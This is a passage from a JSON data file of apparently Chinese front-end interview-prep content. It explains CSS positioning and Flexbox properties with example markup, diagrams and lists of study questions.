class=\"child\"></div>\n</div>\n<div class=\"sibling\"></div>\n<style type=\"text/css\">\n    .parent {\n        position: relative;\n        width: 480px;\n        height: 320px;\n        background-color: #008800;\n        z-index: 5;\n        left: 50px;\n        top: 50px;\n    }\n    .child {\n        width: 240px;\n        height: 160px;\n        background-color: #ff0000;\n    }\n    .sibling {\n        width: 240px;\n        height: 160px;\n        background-color: #0000ff;\n    }\n</style>\n```\n\n效果如图：\n\n![3.jpg](https://static.ecool.fun//article/78fc169e-eb21-4a54-94a4-3f9b96bfb156.jpeg)\n\n> 为什么要使用它？此属性下引入了在该元素上使用 `z-index` 的能力，这对于静态定位 `position: static` 的元素并不真正起作用。\n\n### 绝对定位 position: absolute\n\n此属性是相对于最近父级元素的位置，如果绝对定位元素没有定位的父级元素，它将使用文档 `body` 并随着页面滚动而移动。`position: absolute` 相对于其父元素的位置放置一个元素并改变它周围的布局。\n\n> 关于绝对定位的权衡是，这些元素将从页面的元素流中删除，具有这种定位类型的元素不受其它元素的影响，也不影响其它元素。\n\n```xml\n<div class=\"parent\">\n    <div class=\"child\"></div>\n</div>\n<div class=\"sibling\"></div>\n<style type=\"text/css\">\n    .parent {\n        position: relative;\n        width: 480px;\n        height: 320px;\n        background-color: #008800;\n    }\n    .child {\n        position: absolute;\n        width: 240px;\n        height: 160px;\n        background-color: #ff0000;\n        left: 20px;\n        top: 20px;\n        z-index: 2;\n    }\n    .sibling {\n        position: absolute;\n        width: 240px;\n        height: 160px;\n        left: 100px;\n        top: 100px;\n        background-color: #0000ff;\n        z-index: 1;\n    }\n</style>\n```\n\n效果如图：\n\n![4.jpg](https://static.ecool.fun//article/3968de0c-e368-4249-b1e1-6c7996077bc6.jpeg)\n\n在此属性下，同一父级元素中，`z-index` 值大的在最上层。\n\n> 绝对定位元素是相对于最近定位的祖先来定位自身。一旦它找到一个已定位的祖先，该祖先之上的元素的位置就不再相关。\n\n![6.jpg](https://static.ecool.fun//article/1500b412-1333-46d7-837e-8e3a45576184.jpeg)\n\n> 相对定位和绝对定位的主要区别在于，`position: absolute` 会将子元素完全脱离文档的正常流程，并且该子元素将相对于具有自己的位置集的第一个父元素进行定位。\n\n### 固定定位 position: fixed\n\n相对于视窗定位，即使页面滚动，也始终停留在同一位置上。固定定位元素不会在其所在的页面中留下间隙，其他元素会填补缺失的地方。\n\n```xml\n<div class=\"parent\">\n    <div class=\"child\"></div>\n</div>\n<div class=\"sibling\"></div>\n<style type=\"text/css\">\n    .parent {\n        position: relative;\n        width: 480px;\n        height: 320px;\n        background-color: #008800;\n    }\n    .child {\n        width: 240px;\n        height: 160px;\n        background-color: #ff0000;\n        left: 20px;\n        top: 20px;\n        z-index: 2;\n    }\n    .sibling {\n        position: fixed;\n        width: 240px;\n        height: 160px;\n        right: 50px;\n        bottom: 50px;\n        background-color: #0000ff;\n        z-index: 1;\n    }\n</style>\n```\n\n效果如图：\n\n![5.jpg](https://static.ecool.fun//article/cdeb8912-fef5-4b16-a80a-05425aca53cf.jpeg)\n\n### 粘性定位 position: sticky\n\n`position: sticky` 是 CSS 中的一种布局方式，通常用于实现“粘性定位”。当元素在页面滚动时，它会保持在视口的某个位置，直到其父元素的边界被滚动到并覆盖该元素，之后元素就会“脱离”视口。\n\n#### **工作原理**\n1. **初始状态**：`position: sticky` 元素是相对于其正常文档流位置定位的，并且它会根据滚动位置“粘”在指定位置。\n2. **滚动时行为**：当页面滚动到该元素所在的位置时，元素会变为固定定位 (`position: fixed`)，并粘附在其父元素的边界内，通常是视口顶部或底部，直到滚动到其父元素的边界时，元素会随父元素一起滚动。\n3. **恢复状态**：当父元素的边界被滚动到时，`sticky` 元素会恢复为正常的文档流定位。\n\n#### **语法**\n```css\nposition: sticky;\ntop: 0; /* 或者 bottom: 0, left: 0, right: 0 等 */\n```\n- `top`, `bottom`, `left`, `right`：控制元素在其父元素中的粘性位置。例如，`top: 0` 会使元素在滚动时粘在视口的顶部。\n\n#### **应用场景**\n- **表头粘性定位**：在长列表中，表头会随着滚动保持可见。\n- **侧边栏**：当用户滚动页面时，侧边栏可以保持在屏幕的一侧，而不是跟随页面滚动。\n- **导航条**：让导航栏保持在视口顶部，直到滚动到页面的某个特定部分时它才会消失。\n\n#### **启用条件**\n  - 必须指定 `top`, `bottom`, `left`, `right` 中的一个或多个属性，决定了元素粘性定位的起始点。\n  - 元素的祖先容器不能有 `overflow: hidden` 或 `overflow: auto` 等样式，否则 `sticky` 会失效。\n  - `sticky` 元素的父元素需要有足够的空间，否则无法触发粘性效果。\n \n",
    "testPoint": "### 1. **CSS 定位基础**\n   - 请简述 CSS 定位的概念以及常见的定位类型。\n   - 什么是相对定位、绝对定位、固定定位、粘性定位？它们的主要区别是什么？\n\n### 2. **`position` 属性**\n   - `position` 属性的值有哪些？解释每种定位方式的行为和应用场景。\n     - `static`：默认定位，元素按文档流排列。\n     - `relative`：相对定位，相对于元素原本的位置进行偏移。\n     - `absolute`：绝对定位，相对于最近的已定位父元素（即父元素有 `position` 属性且不是 `static`）定位。\n     - `fixed`：固定定位，相对于浏览器窗口定位。\n     - `sticky`：粘性定位，结合了相对定位和固定定位的特性。\n\n### 3. **`top`, `right`, `bottom`, `left` 属性**\n   - 当元素使用了相对定位时，`top`、`right`、`bottom` 和 `left` 的作用是什么？它们如何影响元素的位置？\n   - 当元素使用了绝对定位或固定定位时，`top`、`right`、`bottom` 和 `left` 如何影响元素的位置？它们是相对于哪个参考点定位的？\n   - 如何使用这些属性来实现元素的精确定位？\n\n### 4. **定位的参考点**\n   - 绝对定位和固定定位是相对于哪些参考点进行定位的？如何理解“最近的已定位父元素”？\n   - `relative` 定位元素的定位参考点是什么？它和绝对定位的参考点有什么区别？\n\n### 5. **`z-index` 属性**\n   - `z-index` 的作用是什么？它如何影响元素的层级关系？\n   - `z-index` 只能应用于定位元素（`position` 不为 `static` 的元素），解释这一点，并举例说明如何使用 `z-index` 来控制多个元素的层叠顺序。\n   - 在相同的 `z-index` 值下，如何判断元素的层级关系？\n\n### 6. **浮动与定位**\n   - 浮动元素和定位元素的行为有什么区别？\n   - 如何解决浮动元素对文档流的影响？可以用哪些方法使浮动元素脱离文档流或重新回到文档流？\n   - 你是否了解 CSS 定位与浮动结合的情况，如何处理浮动元素与定位元素的关系？\n\n### 7. **`position: relative` 与布局**\n   - `position: relative` 如何影响元素在布局中的位置？请解释它与普通文档流中的元素区别。\n   - 如何利用 `relative` 定位来创建自定义的排列、移动布局？\n\n### 8. **`position: absolute` 与 `position: fixed`**\n   - `position: absolute` 定位元素如何相对于其父元素进行定位？如果没有已定位的父元素，它会相对于哪里定位？\n   - `position: fixed` 元素如何相对于视口定位？如何处理视口大小变化对固定定位元素的影响？\n\n### 9. **`position: sticky` 的应用**\n   - `position: sticky` 定位是什么？它如何结合 `top`, `bottom`, `left`, `right` 属性工作？\n   - 请解释 `position: sticky` 在实际开发中的使用场景，并举例说明如何使用它创建一个粘性导航条。\n   - `position: sticky` 在不同浏览器中的支持情况如何？\n\n### 10. **多重定位**\n   - 当一个元素同时设置了多种定位方式（例如：`position: relative` 和 `position: absolute`）时，如何理解它们之间的关系？\n   - 如何通过嵌套定位元素创建复杂的布局结构？\n\n### 11. **定位与流动布局**\n   - 在使用 `absolute` 或 `fixed` 定位的元素时，如何保证其他元素在文档流中的位置不受影响？如何处理定位元素与其他元素的重叠问题？\n   - 如何使用 `absolute` 定位来实现精确的布局，避免因内容变化导致布局错乱？\n\n### 12. **响应式布局中的定位**\n   - 在响应式设计中，如何通过定位来实现自适应布局？可以结合哪些其他 CSS 属性来更灵活地控制布局？\n   - 如何利用 `position: absolute` 和 `position: relative` 创建响应式网格布局？\n\n### 13. **定位与 `flex` 布局结合**\n   - 在 `flexbox` 布局中，如何使用定位（如 `absolute` 或 `relative`）来控制子元素的位置？\n   - 如何结合 `flexbox` 和定位属性来解决一些布局问题？\n\n### 14. **定位的性能优化**\n   - 在页面中大量使用定位（尤其是绝对定位和固定定位）时，如何确保页面性能的最佳状态？会有哪些潜在的性能问题？\n\n### 15. **实际案例**\n   - 请描述一个实际的项目中你如何使用 CSS 定位来实现一个复杂布局。涉及到哪些定位技术？如何解决了定位中的问题？\n   - 如何使用定位来创建一个响应式、固定顶部的导航栏？",
    "exerciseKeyList": "[\"6248429c-3007-4f72-a429-19d433e60346\",\"98cd24a6-d666-4ddd-a696-f74fbe1552a1\",\"1f131907-c40f-485b-8ff1-67e7091fed68\",\"f1e6c221-11b8-4e5d-8e8b-f4c70d698291\"]",
    "vipLimit": 0,
    "level": 1,
    "pointOrder": 6,
    "createAt": "2024-10-08T09:26:02.000Z",
    "updateAt": "2024-11-10T05:42:08.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "1f131907-c40f-485b-8ff1-67e7091fed68",
        "title": "position：absolute绝对定位，是相对于谁的定位？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-05T08:51:48.000Z",
        "updateAt": "2022-04-05T16:52:03.000Z"
      },
      {
        "exerciseKey": "6248429c-3007-4f72-a429-19d433e60346",
        "title": "position: fixed 一定是相对于浏览器窗口进行定位吗？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-10-10T12:40:23.000Z",
        "updateAt": "2022-10-30T11:08:40.000Z"
      },
      {
        "exerciseKey": "98cd24a6-d666-4ddd-a696-f74fbe1552a1",
        "title": "为什么有时候⽤translate来改变位置⽽不是使用position进行定位？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-06-25T05:56:29.000Z",
        "updateAt": "2024-08-10T17:06:44.000Z"
      },
      {
        "exerciseKey": "f1e6c221-11b8-4e5d-8e8b-f4c70d698291",
        "title": "CSS 中有哪几种定位方式？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T13:47:23.000Z",
        "updateAt": "2024-07-22T09:23:55.000Z"
      }
    ]
  },
  "113": {
    "id": 113,
    "tagId": 11,
    "title": "Flexbox",
    "explanation": "### 一、Flexbox布局的概念\n\nFlexbox布局也叫Flex布局，弹性盒子布局。它的**目标**是提供一个更有效地布局、对齐方式，并且能够使父元素在子元素的大小未知或动态变化情况下仍然能够分配好子元素之间的间隙。**主要思想**是使父元素能够调整子元素的宽度、高度、排列方式，从而更好的适应可用的布局空间。设定为flex布局的元素能够放大子元素使之尽可能填充可用空间，也可以收缩子元素使之不溢出。 ​\n\nFlex布局更适合小规模的布局，可以简便、完整、响应式的实现各种页面布局。但是，设为Flex布局以后，其子元素的`float`、`clear`和`vertical-align`属性将失效。Flex弹性盒模型的优势在于只需声明布局应该具有的⾏为，⽽不需要给出具体的实现⽅式，浏览器负责完成实际布局，当布局涉及到不定宽度，分布对⻬的场景时，就要优先考虑弹性盒布局。\n\nFlex布局是一个完整的模块，它包括了一套完整的属性。其中采用 Flex 布局的元素，称为 Flex 容器，简称\"**容器**\"。它的所有子元素就是容器成员，称为 Flex 项目，简称\"**项目**\"。\n\n![Flexbox布局.png](https://static.ecool.fun//article/5b18f767-e9f1-497e-a11d-a045123e8848.jpeg)\n\n容器默认存在两个轴：**水平轴**（main axis）和**垂直轴**（cross axis），项目默认沿主轴排列（水平轴）：\n\n![Flexbox布局-主轴.png](https://static.ecool.fun//article/125a0cfd-8814-475f-aa8f-25da975ebaa6.jpeg)\n\n这里面涉及到了几个概念，下面来看一下：\n\n-   **main axis**: Flex 父元素的主轴是指子元素布局的主要方向轴，它由属性flex-direction来确定主轴是水平还是垂直的，默认为水平轴。\n-   **main-start & main-end**: 分别表示主轴的开始和结束，子元素在父元素中会沿着主轴从main-start到main-end排布。\n-   **main size**: 单个项目占据主轴的长度大小。\n-   **cross axis**: 交叉轴，与主轴垂直。\n-   **cross-start & cross-end**: 分别表示交叉轴的开始和结束。子元素在交叉轴的排布从cross-start开始到cross-end。\n-   **cross size**: 子元素在交叉轴方向上的大小。\n\n### 二、父元素属性\n\n想要使用flex布局，首先需要给父元素指定为flex布局，这样容器内的元素才能实现flex布局：\n\n```css\n<div class=\"container\"></div>\n\n.container {\n    display: flex | inline-flex;\n}\n```\n\n这里有两种方式可以设置flex布局，使用`display: flex;`会生成一个块状的flex容器盒子，使用`display: inline-flex;`会生成一个行内的flex容器盒子。如果我们使用块状元素，比如div标签，就可以使用flex，如果使用行内元素，就可以使用inline-flex。多数情况下，我们会使用**display: flex;**。\n\n父元素（容器）可以设置以下六个属性：\n\n-   flex-direction\n-   flex-wrap\n-   flex-flow\n-   justify-content\n-   align-items\n-   align-content\n\n#### 1\\. flex-direction\n\n**flex-direction**：主轴方向，它决定了容器内元素排列方向，它有四个属性值：\n\n```css\n.container {\n    flex-direction: row | row-reverse | column | column-reverse;\n}\n```\n\n（1）`flex-direction: row`：默认值，沿水平主轴从左到右排列，起点在左沿\n\n![Flexbox布局-flex-direction.png](https://static.ecool.fun//article/31bad1de-edb1-4a52-adba-ab25e7c7b649.jpeg)\n\n（2）`flex-direction: row-reverse`：沿水平主轴从右到左排列，起点在右沿\n\n![Flexbox布局-flex-direction1.png](https://static.ecool.fun//article/77321a35-e051-428b-ba13-e882ac0b03c5.jpeg)\n\n（3）`flex-direction: column`：沿垂直主轴从上到下排列，起点在上沿\n\n![Flexbox布局-flex-direction2.png](https://static.ecool.fun//article/3c3188a4-33d0-41f9-b589-4f0ce9afce4b.jpeg)\n\n（4）`flex-direction: column-reverse`：沿垂直主轴从下到上排列，起点在下沿\n\n![Flexbox布局-flex-direction4.png](https://static.ecool.fun//article/f46a034c-7a6c-45d0-b320-ad1337ee4e1f.jpeg)\n\n#### 2\\. flex-wrap\n\n**flex-wrap**：容器内元素是否可以换行，它有三个属性值：\n\n```css\n.container {\n    flex-wrap: nowrap | wrap | wrap-reverse;\n}\n```\n\n（1）`flex-wrap: nowrap`：默认值，不换行。当主轴的长度是固定并且空间不足时，项目尺寸会随之进行调整，而不会换行。\n\n![Flexbox布局-flex-direction3.png](https://static.ecool.fun//article/b9ea7657-264a-44ee-b325-b992f5e3caee.jpeg)\n\n（2）`flex-wrap: wrap`：换行，第一行在上面\n\n![Flexbox布局-flex-direction5.png](https://static.ecool.fun//article/18bc2b29-aafa-49fb-ab77-1a620cffbc64.jpeg)\n\n（3）`flex-wrap: wrap-reverse`：换行，第一行在下面\n\n![Flexbox布局-flex-direction6.png](https://static.ecool.fun//article/f916ff88-619f-4331-b2c3-fa9277bb8961.jpeg)\n\n#### 3\\. flex-flow\n\n`flex-flow` 是 `flex-direction` 属性和`flex-wrap`属性的简写，默认为:`flex-flow:row nowrap`，用处不大，最好还是分开来写。该属性的书写格式如下：\n\n```css\n.container {\n    flex-flow: <flex-direction> <flex-wrap>;\n}\n```\n\n#### 4\\. justify-content\n\n**justify-content**：元素在主轴的对齐方式，它有五个属性值：\n\n```css\n.container {\n    justify-content: flex-start | flex-end | center | space-between | space-around;\n}\n```\n\n这里以水平方向为主轴进行举例，即**flex-direction: row。**\n\n（1）`justify-content : flex-start`：默认值，元素在主轴上**左对齐**（**上对齐**）\n\n![Flexbox布局-jusitify.png](https://static.ecool.fun//article/38782598-7239-4fac-a3c2-31c3f09dbc8f.jpeg)​\n\n（2）`justify-content : flex-end`：元素在主轴上**右对齐**（**下对齐）**\n\n![Flexbox布局-flex1.png](https://static.ecool.fun//article/15396450-a1cb-41a6-a2bb-6deea714cce0.jpeg)\n\n（3）`justify-content : center` ：元素在主轴上**居中对齐**\n\n![Flexbox布局-flex3png.png](https://static.ecool.fun//article/06591295-84cf-4038-92b1-7cd93f85a144.jpeg)\n\n（4）`justify-content : space-between`：元素在主轴上**两端对齐**，元素之间间隔相等\n\n![Flexbox布局-flex4.png](https://static.ecool.fun//article/02c3743d-166a-422a-90a5-70a0488c8389.jpeg)\n\n（5）`justify-content : space-around` ：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。\n\n![Flexbox布局-flex5.png](https://static.ecool.fun//article/712a1310-0fe9-401b-aeba-eee24d9b0207.jpeg)\n\n#### 5\\. align-items\n\n**align-item**：元素在交叉轴上的对齐方式，它有五个属性值：\n\n```css\n.container {\n    align-items: flex-start | flex-end | center | baseline | stretch;\n}\n```\n\n这里以水平方向为主轴进行举例，即**flex-direction: row。**\n\n（1）`align-item：flex-start`：交叉轴的起点对齐（上面或左边）。设置容器高度为 100px，项目高度分别为 20px、40px、60px、80px、100px，效果如图所示：\n\n![Flexbox布局-flex2.png](https://static.ecool.fun//article/32efe724-5377-4fd0-84be-5bf97ef5aa29.jpeg)\n\n（2）`align-item：flex-end`：交叉轴的终点对齐（下面或右边）。设置容器高度为 100px，项目高度分别为 20px、40px、60px、80px、100px，效果如图所示：\n\n![Flexbox布局-flex3.png](https://static.ecool.fun//article/6490899b-6fa2-4a48-9e50-d2f6ca185acc.jpeg)\n\n（3）`align-item：center`：交叉轴的中点对齐。设置容器高度为 100px，项目高度分别为 20px、40px、60px、80px、100px，效果如图所示：\n\n![Flexbox布局-flex4.png](https://static.ecool.fun//article/e1451fba-1ed8-4233-a21d-721a596e600b.jpeg)\n\n（4）`align-item：stretch`：默认值、如果元素未设置高度或设为auto，将占满整个容器的高度。假设容器高度设置为 100px，而项目没有设置高度，则项目的高度也为 100px：\n\n![Flexbox布局-flex1.png](https://static.ecool.fun//article/c4d6733d-75fa-47c9-8305-e5d8740e09a3.jpeg)\n\n（5）`align-item：baseline`：以元素的第一行文字的基线对齐\n\n![Flexbox布局-flex5.png](https://static.ecool.fun//article/9fa0c95e-ebd1-4322-90f4-06bb959d98a2.jpeg)\n\n#### 6\\. align-content\n\n**align-content**：多根轴线对齐方式。如果元素只有一根轴线，该属性不起作用。它有六个属性值：\n\n```css\n.container {\n    align-content: flex-start | flex-end | center | space-between | space-around | stretch;\n}\n```\n\n那这个轴线数怎么确定呢？实际上这主要是由flex-wrap属性决定的，当flex-wrap 设置为 nowrap 时，容器仅存在一根轴线，因为项目不会换行，就不会产生多条轴线。当 flex-wrap 设置为 wrap 时，容器可能会出现多条轴线，这时就需要去设置多条轴线之间的对齐方式。\n\n这里以水平方向为主轴时举例，即：flex-direction: row; flex-wrap: wrap;\n\n（1）`align-content: stretch`：默认值，轴线占满整个交叉轴。这里我们先设置每个项目都是固定宽度，效果如下：\n\n![Flexbox布局-flex-10.png](https://static.ecool.fun//article/7485c438-658b-4cfa-8a20-9ad5bdb5ed03.jpeg)\n\n下面就去掉每个项目的高度，它会占满整个交叉轴，效果如下：\n\n![Flexbox布局-flex11.png](https://static.ecool.fun//article/d90f0329-e9df-4e15-86f5-f114a2b0700a.jpeg)\n\n（2）`align-content: flex-start`：从交叉轴开始位置填充\n\n![Flexbox布局-flex12.png](https://static.ecool.fun//article/ec3c6135-a40a-445a-b960-3479dec46b44.jpeg)\n\n（3）`align-content: flex-end`：从交叉轴结尾位置填充\n\n![Flexbox布局-flex13.png](https://static.ecool.fun//article/9abb0c34-4191-4cec-a10e-f68e5999ac33.jpeg)\n\n（4）`align-content: center`：与交叉轴中点对齐\n\n![Flexbox布局-flex14.png](https://static.ecool.fun//article/3a25128c-4e73-4a63-9697-882ecc95ba60.jpeg)\n\n（5）`align-content: space-between`：与交叉轴两端对齐，轴线之前的间隔平均分布\n\n![Flexbox布局-flex15.png](https://static.ecool.fun//article/b67e6cea-8150-4c06-be7e-1a37a3fa0c70.jpeg)\n\n（6）`align-content: space-around`：每根轴线两侧的间隔都相等。所以，轴线之间的间隔比轴线与边框的间隔大一倍\n\n![Flexbox布局-flex16.png](https://static.ecool.fun//article/4b8c4655-d2a6-4b60-a9f6-a0a49edd0b1a.jpeg)\n\n### 三、子元素属性\n\n子元素有以下六个属性：\n\n-   order\n-   flex-grow\n-   flex-shrink\n-   flex-basis\n-   flex\n-   align-self\n\n#### 1\\. order\n\n`order`属性用来定义项目的排列顺序。数值越小，排列越靠前，默认为`0`。使用形式如下：\n\n```css\n.item {\n    order: <integer>;\n}\n```\n\n![Flexbox布局-第 4 页.png](https://static.ecool.fun//article/dc7d3cdd-f7b7-4369-8fef-54db534f7aa0.jpeg)\n\n#### 2\\. flex-basis\n\n`flex-basis`属性定义了在分配多余空间之前，项目占据的主轴空间，浏览器会根据这个属性来计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小。使用形式如下：\n\n```css\n.item {\n    flex-basis: <length> | auto;\n}\n```\n\n当主轴设置为水平时，当设置了 flex-basis，设置的项目宽度值会失效，`flex-basis` 需要跟 `flex-grow` 和 `flex-shrink` 配合使用才能生效。有两种特殊的值：\n\n-   当 `flex-basis` 值为 0 % 时，项目尺寸会被认为是0，因此无论项目尺寸设置多少都用；\n-   当 `flex-basis` 值为 auto 时，则跟根据尺寸的设定值来设置大小。\n\n#### 3\\. flex-grow\n\n`flex-grow`属性定义项目的放大比例，默认为0，即如果存在剩余空间时也不放大。\n\n当容器中所有的项目都设置了flex-basis属性时，如果仍有是剩余的空间，设置的 `flex-grow` 属性才能生效。\n\n-   如果所有项目的flex-grow属性都设置为1，那么它们会均分剩余的空间，如下图所示：\n\n![Flexbox布局-第 4 页1.png](https://static.ecool.fun//article/04ea20d1-1b1d-46c6-ab75-1df01d56a22f.jpeg)\n\n-   如果其中一个项目的flex-grow属性设置为2，其他均为1，那么它占据的剩余空间就是其他项目的两倍，如下图所示：\n\n![Flexbox布局-第 4 页2.png](https://static.ecool.fun//article/23ac2178-0caf-4c42-98cb-3b11dfd795ff.jpeg)\n\n#### 3\\. flex-shrink\n\n`flex-shrink`属性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小。不能设置负值，使用形式如下：\n\n```css\n.item {\n    flex-shrink: <number>;\n}\n```\n\n-   如果所有项目的 flex-shrink 属性都为 1，当空间不足时，都将等比例缩小，如下图所示：\n\n![Flexbox布局-第 4 页6.png](https://static.ecool.fun//article/2ed5beca-6d41-4bdf-b2db-0d009f60abf2.jpeg)\n\n-   如果一个项目的 flex-shrink 属性为 0，其他项目都为 1，则空间不足时，前者不缩小，如下图所示：\n\n![Flexbox布局-第 4 页3.png](https://static.ecool.fun//article/7c7fe0c1-d203-49e2-aab5-623d7827ec78.jpeg)\n\n#### 5\\. flex\n\n`flex`属性是`flex-grow`, `flex-shrink` 和 `flex-basis`的简写，后两个属性可选。默认值为：`flex:0 1 auto。`使用形式如下：\n\n```css\n.item{\n    flex: none | [ <'flex-grow'> <'flex-shrink'>? || <'flex-basis'> ]\n}\n```\n\n对于flex的取值有几种常用的特殊情况： （1）默认值：flex:0 1 auto，即在有剩余空间时，只放大不缩小\n\n```css\n.item {\n  flex:0 1 auto;\n}\n.item {\n  flex-grow: 0;\n  flex-shrink: 1;\n  flex-basis: auto;\n}\n```\n\n（2）flex: none，即有剩余空间时，不放大也不缩小，最终尺寸通常表现为最大内容宽度。\n\n```css\n.item {\n  flex:0 0 auto;\n}\n.item {\n  flex-grow: 0;\n  flex-shrink: 0;\n  flex-basis: auto;\n}\n```\n\n（3）flex: 0，即当有剩余空间时，项目宽度为其内容的宽度，最终尺寸表现为最小内容宽度。\n\n```css\n.item {\n  flex:0 1 0%;\n}\n.item {\n  flex-grow: 0;\n  flex-shrink: 1;\n  flex-basis: 0%;\n}\n```\n\n（4）flex: auto，即元素尺寸可以弹性增大，也可以弹性变小，具有十足的弹性，但在尺寸不足时会优先最大化内容尺寸。\n\n```css\n.item {\n  flex:1 1 auto;\n}\n.item {\n  flex-grow: 1;\n  flex-shrink: 1;\n  flex-basis: auto;\n}\n```\n\n（5）flex: 1，即元素尺寸可以弹性增大，也可以弹性变小，具有十足的弹性，但是在尺寸不足时会优先最小化内容尺寸，\n\n```css\n.item {\n  flex:1 1 0%;\n}\n.item {\n  flex-grow: 1;\n  flex-shrink: 1;\n  flex-basis: 0%;\n}\n```\n\n#### 6\\. align-self\n\n`align-self`属性允许单个项目有与其他项目不一样的对齐方式，可覆盖`align-items`属性。默认值为`auto`，表示继承父元素的`align-items`属性，如果没有父元素，则等同于`stretch`。\n\n```css\n.item {\n     align-self: auto | flex-start | flex-end | center | baseline | stretch;\n}\n```\n\n这个属性和align-items属性的效果是一样的，只不过这个属性只对单个项目生效，而align-items是对容器中所有的项目生效。\n\n设置容器的align-items属性为flex-start，容器中第三个项目的align-self属性为flex-end，效果如下：\n\n![Flexbox布局111.png](https://static.ecool.fun//article/8c409b02-21af-4d4d-aa52-4bc0867ba2fa.jpeg) \nFlex布局的基本使用主要就是这些了，flex布局可能是目前最好用的布局方式之一，不过仅限于小规模的布局，对于大规模的布局，可以使用grid布局。",
    "testPoint": "1. **基本概念**：\n   - 理解 Flexbox 的基本概念和目的：提供一种在容器内分配空间和对齐子元素的方式。\n\n2. **主要属性**：\n   - **容器属性**：\n     - `display: flex;`：将普通块元素变为 flex 容器。\n     - `flex-direction`：定义主轴方向（`row`, `row-reverse`, `column`, `column-reverse`）。\n     - `flex-wrap`：控制子元素是否换行（`nowrap`, `wrap`, `wrap-reverse`）。\n     - `justify-content`：定义主轴上的对齐方式（`flex-start`, `flex-end`, `center`, `space-between`, `space-around`）。\n     - `align-items`：定义交叉轴上的对齐方式（`flex-start`, `flex-end`, `center`, `baseline`, `stretch`）。\n     - `align-content`：在有多条行的情况下，控制行之间的对齐（`flex-start`, `flex-end`, `center`, `space-between`, `space-around`, `stretch`）。\n\n3. **子元素属性**：\n   - **flex**：简写属性，允许设置三个属性：`flex-grow`、`flex-shrink`、`flex-basis`。\n   - `flex-grow`：定义项目的放大比例。\n   - `flex-shrink`：定义项目的缩小比例。\n   - `flex-basis`：定义在分配多余空间之前，项目占据的主轴空间。\n   - `align-self`：允许单个项目改变其父容器的对齐方式。\n\n4. **响应式设计**：\n   - 如何利用 Flexbox 制作响应式布局，适应不同的屏幕尺寸和方向。\n\n5. **常见布局模式**：\n   - 使用 Flexbox 实现常见布局，例如中心对齐、瀑布流布局、导航栏、卡片布局等。\n\n6. **与其他布局模型的比较**：\n   - Flexbox 与 CSS Grid、Floats、Inline-Block 等布局模型的区别与适用场景。\n\n7. **处理溢出与换行**：\n   - 在 Flexbox 中如何处理元素的溢出和换行，确保布局良好。\n\n8. **浏览器支持与前缀**：\n   - 了解 Flexbox 的浏览器支持情况及需要的前缀（如 `-webkit-`）。\n\n9. **实践应用**：\n   - 常见的 Flexbox 相关面试题，例如给定一个布局要求，如何用 Flexbox 实现。\n",
    "exerciseKeyList": "[\"286f8c5a-9f06-476d-9670-bd02de26db4e\",\"27a34d44-74b5-4406-b6e6-61f4b1d203a1\",\"389a7ca7-43d2-4fbe-99ef-50bea32bef5c\",\"286f67d3-4e8d-48f5-962a-ed9cccc46335\",\"dd65350c-9907-4d3a-a01c-baeebb3e963d\",\"9cc69b35-a6f3-466a-8724-7b855b38a1a9\",\"e33db22c-e826-41f0-b5a9-33b9a03091bc\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 10,
    "createAt": "2024-10-08T09:29:48.000Z",
    "updateAt": "2024-11-10T05:42:05.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "27a34d44-74b5-4406-b6e6-61f4b1d203a1",
        "title": "”flex: auto;“是什么意思？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-12-03T12:21:54.000Z",
        "updateAt": "2024-08-10T17:07:30.000Z"
      },
      {
        "exerciseKey": "286f67d3-4e8d-48f5-962a-ed9cccc46335",
        "title": "CSS中的 “flex:1;” 是什么意思？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-01T11:05:55.000Z",
        "updateAt": "2024-08-10T17:05:37.000Z"
      },
      {
        "exerciseKey": "286f8c5a-9f06-476d-9670-bd02de26db4e",
        "title": "flex 布局下，怎么改变元素的顺序？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-12-17T09:51:25.000Z",
        "updateAt": "2025-03-18T12:03:52.000Z"
      },
      {
        "exerciseKey": "389a7ca7-43d2-4fbe-99ef-50bea32bef5c",
        "title": "怎么让CSS flex布局最后一行列表左对齐？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-02-27T02:57:47.000Z",
        "updateAt": "2024-07-19T15:55:03.000Z"
      },
      {
        "exerciseKey": "9cc69b35-a6f3-466a-8724-7b855b38a1a9",
        "title": "如何实现两栏布局，右侧自适应？三栏布局中间自适应呢？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:22:35.000Z",
        "updateAt": "2024-08-10T19:45:47.000Z"
      },
      {
        "exerciseKey": "dd65350c-9907-4d3a-a01c-baeebb3e963d",
        "title": "flexbox（弹性盒布局模型）是什么，适用什么场景？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:23:32.000Z",
        "updateAt": "2024-08-10T19:47:22.000Z"
      },
      {
        "exerciseKey": "e33db22c-e826-41f0-b5a9-33b9a03091bc",
        "title": "css 中三栏布局的实现方案有哪些？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T20:09:48.000Z"
      }
    ]
  },
  "114": {
    "id": 114,
    "tagId": 11,
    "title": "Grid布局",
